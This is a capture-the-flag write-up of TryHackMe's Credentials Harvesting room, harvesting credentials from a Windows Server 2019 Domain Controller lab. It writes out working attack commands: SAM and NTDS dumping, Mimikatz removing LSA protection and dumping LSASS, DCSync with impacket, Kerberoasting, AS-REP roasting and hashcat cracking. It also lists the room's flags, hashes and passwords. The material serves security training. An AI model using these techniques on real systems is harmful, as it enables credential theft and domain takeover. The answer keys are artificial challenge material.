# TryHackMe: Credentials Harvesting

A writeup covering credential harvesting techniques from TryHackMe's *Credentials Harvesting* room. This room focuses on obtaining credentials from a compromised Windows Server 2019 Domain Controller using various local and remote techniques.

## Environment

- **Attack machine:** Kali Linux (WSL2 on Windows) with TryHackMe premium VPN (US-West-2 server, downloaded from the TryHackMe access page)
- **Lab machine:** Windows Server 2019 Domain Controller (IP changes on reset — check TryHackMe room page)
- **RDP credentials:** `thm` / `Passw0rd!`
- **Tools used:** Mimikatz, impacket-secretsdump, impacket-GetUserSPNs, impacket-GetNPUsers, hashcat, Get-WebCredentials.ps1, vaultcmd

### WSL2/FreeRDP Notes

- RDP required `/sec:nla` flag for this room's machine: `xfreerdp /v:<ip> /u:thm /p:Passw0rd! /cert:ignore /sec:nla`
- Without `/sec:nla` the connection consistently failed with `ERRCONNECT_CONNECT_FAILED`
- Lab machine IP changes on every reset — always verify from the room page
- Premium VPN routes `10.144.0.0/12` through `tun0` at `192.168.131.x`

---

## Task 3 — Credential Access

Two quick wins from basic enumeration:

**Registry search for credentials:**
```cmd
reg query HKLM /f flag /t REG_SZ /s
```
Found: `HKEY_LOCAL_MACHINE\SYSTEM\THM` → `flag` = `password: 7tyh4ckm3`

**AD user description field:**
```powershell
Get-ADUser -Filter * -Properties Description | Select-Object Name, Description | Format-List
```
Found: `THM Victim` → Description: `Change the password: Passw0rd!@#`

**Answers:**
- Registry flag value: `7tyh4ckm3`
- AD victim user password: `Passw0rd!@#`

---

## Task 4 — Local Windows Credentials (SAM Database)

**Method: Remote dump via impacket-secretsdump**

Since SCP to the lab machine's SSH service failed (password auth denied), used impacket to dump the SAM remotely over SMB:

```bash
impacket-secretsdump thm:Passw0rd\!@<lab_ip>
```

Output (local SAM section):
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:98d3a787a80d08385cea7fb4aa2a4261:::
```

The format is `username:RID:LMhash:NThash` — NTLM hash is the last value.

**Answer:** Local Administrator NTLM hash: `98d3a787a80d08385cea7fb4aa2a4261`

**Alternative method (Volume Shadow Copy):**
```cmd
wmic shadowcopy call create Volume='C:\'
vssadmin list shadows
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\Administrator\Desktop\sam
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\users\Administrator\Desktop\system
```

**Registry method:**
```cmd
reg save HKLM\sam C:\users\Administrator\Desktop\sam-reg
reg save HKLM\system C:\users\Administrator\Desktop\system-reg
```
Then decrypt locally: `impacket-secretsdump -sam sam-reg -system system-reg LOCAL`

---

## Task 5 — LSASS Memory Dump

**Is LSA protection enabled?**
```cmd
reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL
```
Result: `RunAsPPL = 0x1` → **Yes, LSA protection is enabled**

**Bypassing LSA protection with Mimikatz:**

Critical: Mimikatz must be run from its own directory (`C:\Tools\Mimikatz\`) and from an Administrator cmd prompt, otherwise `!+` fails with `isFileExist` error.

```cmd
cd C:\Tools\Mimikatz\
mimikatz.exe
```
```
privilege::debug
!+
!processprotect /process:lsass.exe /remove
sekurlsa::logonpasswords
```

Note: `!+` loads the `mimidrv.sys` kernel driver which can cause RDP session instability — if the session crashes, reconnect and proceed. The driver effect doesn't persist across Mimikatz sessions so `!+` must be re-run each time.

**Key finding from logonpasswords:** Passwords show as `(null)` in WDigest on Windows Server 2019 — Microsoft disabled clear-text password caching by default on modern systems.

**Answers:**
- LSA protection enabled: `Y`

---

## Task 6 — Windows Credential Manager

**Web Credentials — Get-WebCredentials.ps1:**
```powershell
powershell -ex bypass
Import-Module C:\Tools\Get-WebCredentials.ps1
Get-WebCredentials
```
Result: `THMuser` → `internal-app.thm.red` → `E4syPassw0rd`

**Vault listing via Mimikatz:**
```
vault::list
```
Shows Web Credentials and Windows Credentials vault contents including decrypted passwords where available.

**Stored credentials enumeration:**
```cmd
cmdkey /list
```
Shows all stored credentials for the current user — found SMB share credential for `10.10.237.226`.

**RunAs with saved credentials:**
```cmd
runas /savecred /user:THM.red\thm-local cmd.exe
```
In the new window:
```cmd
type "c:\Users\thm-local\Saved Games\flag.txt"
```

**Answers:**
- Web credential password for internal-app.thm.red: `E4syPassw0rd`
- SMB share password: `jfxKruLkkxoPjwe3`
- Flag from thm-local desktop: `THM{RunA5S4veCr3ds}`

---

## Task 7 — Domain Controller (NTDS)

**Local NTDS dump using ntdsutil:**
```powershell
ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q
```
Creates dump in `c:\temp\Active Directory\ntds.dit` and `c:\temp\registry\` (SYSTEM + SECURITY files).

**Remote DC Sync via impacket-secretsdump:**
```bash
impacket-secretsdump thm:Passw0rd\!@<lab_ip>
```
Bootkey appears as first line: `Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821`

**DC Sync with just-dc flag:**
```bash
impacket-secretsdump -just-dc-ntlm THM.red/thm:Passw0rd\!@<lab_ip>
```

**Cracking NTLM hashes with hashcat:**
```bash
echo "077cccc23f8ab7031726a3b70c694a49" > /tmp/bk-admin.hash
hashcat -m 1000 -a 0 /tmp/bk-admin.hash /usr/share/wordlists/rockyou.txt
```
Result: `077cccc23f8ab7031726a3b70c694a49:Passw0rd123`

Note: `bk-admin`, `thm-local`, and `admin` all shared the same NTLM hash — common real-world finding of password reuse across admin accounts.

**Answers:**
- Target system bootkey: `0x36c8d26ec0df8b23ce63bcefa6e2d821`
- bk-admin cleartext password: `Passw0rd123`

---

## Task 8 — Local Administrator Password Solution (LAPS)

LAPS stores local administrator passwords in AD computer object attributes (`ms-mcs-AdmPwd`). Only specific groups have read access to these attributes.

**Check if LAPS is installed:**
```cmd
dir "C:\Program Files\LAPS\CSE"
```

**Enumerate LAPS-enabled OUs and permission holders:**
```powershell
Find-AdmPwdExtendedRights -Identity THMorg
```
Result: `LAPsReader` group has ExtendedRightHolder permissions.

**Find members of LAPsReader:**
```cmd
net groups "LAPsReader"
```
Result: `bk-admin`

**Get LAPS password (must run as bk-admin):**
```cmd
runas /user:thm.red\bk-admin powershell.exe
```
Password: `Passw0rd123`

In the new PowerShell window:
```powershell
Get-AdmPwdPassword -ComputerName creds-harvestin
```
Result: `THMLAPSPassw0rd`

**Answers:**
- Group with ExtendedRightHolder: `LAPsReader`
- LAPS password for Creds-Harvestin: `THMLAPSPassw0rd`
- User able to read LAPS passwords: `bk-admin`

---

## Task 9 — Other Attacks

### Kerberoasting

Targets service accounts with SPNs — requests a TGS ticket and cracks it offline.

**Find SPN accounts:**
```bash
impacket-GetUserSPNs -dc-ip <lab_ip> THM.red/thm:Passw0rd\!
```
Found: `svc-thm` with SPN `http/creds-harvestin.thm.red`

**Request TGS ticket:**
```bash
impacket-GetUserSPNs -dc-ip <lab_ip> THM.red/thm:Passw0rd\! -request-user svc-thm -outputfile /tmp/svc-thm.hash
```

**Crack with hashcat:**
```bash
hashcat -a 0 -m 13100 /tmp/svc-thm.hash /usr/share/wordlists/rockyou.txt
```
Result: `Passw0rd1`

### AS-REP Roasting

Targets accounts with "Do not require Kerberos pre-authentication" set.

```bash
impacket-GetNPUsers -dc-ip <lab_ip> thm.red/ -usersfile /tmp/users.txt
```
Then crack the returned `$krb5asrep$23$...` hash with hashcat `-m 18200`.

### SMB Relay / LLMNR Poisoning

- SMB Relay: MITM attack against NTLM challenge-response when SMB signing is disabled
- LLMNR/NBNS Poisoning: Spoof responses to multicast name resolution queries to capture NTLM hashes (Responder is the common tool)

**Answers:**
- SPN for the domain controller: `svc-thm`
- svc-thm cracked password: `Passw0rd1`

---

## Key Takeaways

- **Registry and AD descriptions** are easy wins — admins frequently leave credentials in plaintext in these locations.
- **LSA protection** (`RunAsPPL`) can be bypassed with Mimikatz's `mimidrv.sys` kernel driver, but requires running from the tool's own directory and loading the driver with `!+` before `!processprotect`.
- **WDigest cleartext caching** is disabled by default on Windows 10/Server 2016+ — expect `(null)` passwords from `sekurlsa::logonpasswords` on modern systems.
- **impacket-secretsdump** is a powerful remote alternative to local Mimikatz when direct access is difficult — works over SMB with admin credentials.
- **LAPS** improves local admin password management but creates a new attack surface: compromise any account in the LAPS reader group to get cleartext local admin passwords for all managed machines.
- **Kerberoasting** is highly effective against service accounts with weak passwords — any authenticated domain user can request TGS tickets and crack them offline.
- **Password reuse** across admin accounts (`bk-admin`, `thm-local`, `admin` all sharing the same hash) is a common real-world finding that dramatically expands lateral movement opportunities.
